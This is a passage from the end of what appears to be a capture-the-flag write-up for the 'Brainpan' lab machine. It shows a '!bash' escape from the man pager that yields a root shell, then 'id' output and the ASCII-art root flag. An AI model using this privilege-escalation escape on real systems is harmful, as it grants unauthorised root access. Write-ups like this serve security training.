AUTHOR
       Written by Richard Mlynarik.

!bash

</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p"># id
uid=0(root) gid=0(root) groups=0(root)
</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p"># hostname -I
10.10.27.47
</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p"># cat /root/b.txt 

_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com  

</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p">#</span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
  </footer><br><br>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
